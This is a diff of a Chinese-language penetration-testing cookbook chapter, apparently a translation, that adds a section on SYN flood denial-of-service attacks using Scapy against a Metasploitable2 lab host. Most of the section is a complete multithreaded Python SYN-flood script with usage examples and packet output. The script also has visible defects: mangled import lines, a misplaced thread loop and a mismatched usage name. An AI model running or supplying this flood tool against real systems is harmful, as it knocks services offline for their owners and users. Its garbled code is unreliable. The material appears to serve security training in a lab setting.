@@ -674,7 +674,7 @@ Sent 2 packets.
 
 DNS 放大攻击的效率取决于 DNS 查询的响应大小。 另外，可以通过使用多个 DNS 服务器来增加攻击的威力。
 
-## SNMP 放大 DoS 攻击
+## 6.5 SNMP 放大 DoS 攻击
 
 SNMP 扩展攻击通过伪造具有大型响应的查询，来利用团体字符串可预测的 SNMP 设备。 通过使用分布式 DDoS 组件，以及通过同时向多个 SNMP 设备发送请求，可以提高这种攻击的效率。
 
@@ -1003,3 +1003,208 @@ pwnbox.lizard.com        123 172.16.36.3           35 4 4    5d0     65      51
 +   来自所使用的网络功能的响应应该显着大于用于请求它的请求。
 
 NTP  放大攻击的效率取决于 NTP  查询的响应大小。 另外，可以通过使用多个 NTP  服务器来增加攻击的威力。
+
+## 6.7 SYN 泛洪 DoS 攻击
+
+SYN 泛洪 DoS攻击是一种资源消耗攻击。 它的原理是向作为攻击目标的服务相关的远程端口发送大量 TCP SYN 请求。 对于目标服务接收的每个初始 SYN 分组，然后会发送出 SYN + ACK 分组并保持连接打开，来等待来自发起客户端的最终 ACK 分组。 通过使用这些半开请求使目标过载，攻击者可以使服务无响应。
+
+### 准备
+
+为了使用 Scapy 对目标执行完整的 SYN 泛洪，你需要有一个运行 TCP 网络服务的远程系统。 提供的示例使用 Metasploitable2 的实例用。 有关设置 Metasploitable2 的更多信息，请参阅本书第一章中的“安装 Metasploitable2”秘籍。 此外，本节需要使用文本编辑器（如 VIM 或 Nano）将脚本写入文件系统。 有关编写脚本的更多信息，请参阅本书第一章中的“使用文本编辑器（VIM 和 Nano）”秘籍。
+
+### 操作步骤
+
+为了使用 Scapy 执行 SYN 泛洪，我们需要通过与目标服务关联的端口发送 TCP SYN 请求来开始。 为了向任何给定端口发送 TCP SYN 请求，我们必须首先构建此请求的层级。 我们将需要构建的第一层是 IP 层：
+
+```
+root@KaliLinux:~# scapy Welcome to Scapy (2.2.0) 
+>>> i = IP() 
+>>> i.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 127.0.0.1
+  dst= 127.0.0.1
+  \options\ 
+>>> i.dst = "172.16.36.135"
+>>> i.display()
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= ip
+  chksum= None
+  src= 172.16.36.224
+  dst= 172.16.36.135
+  \options\
+```
+
+要构建我们的请求的 IP 层，我们应该将 `IP` 对象赋给变量`i`。 通过调用`display()`函数，我们可以确定该对象的属性配置。 通常，发送和接收地址都设为回送地址`127.0.0.1`。 可以通过将`i.dst`设置为广播地址的字符串值，来更改目标地址并修改这些值。 通过再次调用`display()`函数，我们可以看到，不仅更新了目的地址，而且`Scapy`也会自动将源 IP 地址更新为与默认接口相关的地址。 现在我们已经构建了请求的 IP 层，我们应该继续构建 TCP 层：
+
+```
+>>> t = TCP() 
+>>> t.display() 
+###[ TCP ]###
+  sport= ftp_data
+  dport= http
+  seq= 0
+  ack= 0
+  dataofs= None
+  reserved= 0
+  flags= S
+  window= 8192
+  chksum= None
+  urgptr= 0
+  options= {}
+```
+
+
+要构建我们的请求的 TCP 层，我们将使用与 IP 层相同的技术。 在提供的示例中，`TCP` 对象赋给了`t`变量。 如前所述，可以通过调用`display()`函数来确定默认配置。 在这里，我们可以看到目标端口的默认值是 HTTP 80 端口。对于我们的首次扫描，我们将 TCP 配置保留默认。现在我们构建了 IP 和 TCP 层，我们可以通过堆叠这些层来构造请求：
+
+```
+>>> response = sr1(i/t,verbose=1,timeout=3) 
+Begin emission: 
+Finished to send 1 packets.
+Received 5 packets, got 1 answers, remaining 0 packets 
+>>> response.display() 
+###[ IP ]###
+  version= 4L
+  ihl= 5L
+  tos= 0x0
+  len= 44
+  id= 0
+  flags= DF
+  frag= 0L
+  ttl= 64
+  proto= tcp
+  chksum= 0x9944
+  src= 172.16.36.135
+  dst= 172.16.36.224
+  \options\ 
+###[ TCP ]###
+     sport= http
+     dport= ftp_data
+     seq= 3651201360L
+     ack= 1
+     dataofs= 6L
+     reserved= 0L
+     flags= SA
+     window= 5840
+     chksum= 0x1c68
+     urgptr= 0
+     options= [('MSS', 1460)] 
+ ###[ Padding ]###
+        load= '\x00\x00'
+```
+
+可以通过使用斜杠分隔变量来堆叠 IP 和 TCP 层。 然后可以将这些层赋给表示整个请求的新变量。 然后可以调用`display()`函数来查看请求的配置。 一旦建立了请求，就可以将其传递给发送和接收函数，以便我们可以分析响应：
+
+```
+>>> request = (i/t) 
+>>> request.display() 
+###[ IP ]###
+  version= 4
+  ihl= None
+  tos= 0x0
+  len= None
+  id= 1
+  flags=
+  frag= 0
+  ttl= 64
+  proto= tcp
+  chksum= None
+  src= 172.16.36.224
+  dst= 172.16.36.135
+  \options\ 
+###[ TCP ]###
+     sport= ftp_data
+     dport= http
+     seq= 0
+     ack= 0
+     dataofs= None
+     reserved= 0
+     flags= S
+     window= 8192
+     chksum= None
+     urgptr= 0
+     options= {}
+```
+
+可以在不独立地构建和堆叠每个层的情况下执行相同的请求。 相反，可以通过直接调用函数并向其传递适当的参数来使用单行命令：
+
+```
+>>> sr1(IP(dst="172.16.36.135")/TCP()) 
+Begin emission: 
+......................................................
+Finished to send 1 packets. 
+..* 
+Received 57 packets, got 1 answers, remaining 0 packets 
+<IP  version=4L ihl=5L tos=0x0 len=44 id=0 flags=DF frag=0L ttl=64 proto=tcp chksum=0x9944 src=172.16.36.135 dst=172.16.36.224 options=[] |<TCP  sport=http dport=ftp_data seq=2078775635 ack=1 dataofs=6L reserved=0L flags=SA window=5840 chksum=0xca1e urgptr=0 options=[('MSS', 1460)] |<Padding  load='\x00\x00' |>>> 
+```
+
+SYN 泛洪的效率取决于在给定时间段内可以生成的 SYN 请求的数量。 为了提高这个攻击序列的效率，我写了一个多线程脚本，可以执行可由攻击系统处理的，尽可能多的 SYN 数据包注入的并发进程：
+
+```
+#!/usr/bin/python
+
+from scapy.all 
+import * from time 
+import sleep 
+import thread 
+import random 
+import logging 
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+
+if len(sys.argv) != 4:   
+    print "Usage - ./syn_flood.py [Target-IP] [Port Number] [Threads]"   
+    print "Example - ./sock_stress.py 10.0.0.5 80 20"   
+    print "Example will perform a 20x multi-threaded SYN flood attack"   
+    print "against the HTTP (port 80) service on 10.0.0.5"   
+    sys.exit()
+
+target = str(sys.argv[1]) 
+port = int(sys.argv[2]) 
+threads = int(sys.argv[3])
+
+print "Performing SYN flood. Use Ctrl+C to stop attack." 
+def synflood(target,port):   
+    while 0 == 0:
+        x = random.randint(0,65535)      
+        send(IP(dst=target)/TCP(dport=port,sport=x),verbose=0)
+        
+    for x in range(0,threads):   
+        thread.start_new_thread(synflood, (target,port))
+
+    while 0 == 0:   
+        sleep(1) 
+```
+
+脚本在执行时接受三个参数。 这些参数包括目标 IP 地址，SYN  泛洪所发送到的端口号，以及将用于执行 SYN 泛洪的线程或并发进程的数量。 每个线程以生成 0 到 65,535 之间的整数值开始。 此范围表示可分配给源端口的全部可能值。 定义源和目标端口地址的 TCP 报头的部分在长度上都是 16 比特。 每个位可以为 1 或 0。因此，有`2 ** 16`或 65,536 个可能的 TCP端 口地址。 单个源端口只能保持一个半开连接，因此通过为每个 SYN 请求生成唯一的源端口地址，我们可以大大提高攻击的性能：
+
+```
+root@KaliLinux:~# ./syn_flood.py U
+sage - ./syn_flood.py [Target-IP] [Port Number] [Threads] 
+Example - ./sock_stress.py 10.0.0.5 80 20 
+Example will perform a 20x multi-threaded SYN flood attack against the HTTP (port 80) service on 10.0.0.5 
+root@KaliLinux:~# ./syn_flood.py 172.16.36.135 80 20 
+Performing SYN flood. Use Ctrl+C to stop attack. 
+```
+
+当在没有任何参数的情况下执行脚本时，会将使用方法返回给用户。在提供的示例中，脚本对托管在`172.16.36.135`的 TCP 端口 80 上的 HTTP Web 服务执行，具有 20 个并发线程 。脚本本身提供的反馈很少; 但是，可以运行流量捕获工具（如 Wireshark 或 TCPdump）来验证是否正在发送连接。在非常短暂的时间之后，与服务器的连接尝试会变得非常慢或完全无响应。
+
+### 工作原理
+
+TCP 服务只允许建立有限数量的半开连接。 通过快速发送大量的 TCP SYN 请求，这些可用的连接会被耗尽，并且服务器将不再能够接受新的传入连接。 因此，新用户将无法访问该服务。 通过将其用作 DDoS 并且使多个攻击系统同时执行脚本，该攻击的效率可以进一步加强。
